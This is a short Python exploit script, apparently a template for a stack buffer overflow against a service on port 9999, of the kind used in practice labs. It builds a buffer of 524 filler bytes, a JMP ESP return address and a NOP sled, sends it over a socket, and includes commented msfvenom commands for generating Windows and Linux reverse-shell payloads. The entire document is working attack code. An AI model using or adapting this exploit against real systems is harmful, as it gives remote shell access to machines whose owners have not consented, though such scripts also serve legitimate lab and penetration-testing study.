import socket

ip = "IP"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xF3\x12\x17\x31" # JMP ESP address 311712F3
padding = "\x90"*16
postfix = "\x90\x90\x90\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f py
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f py
payload = ""

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
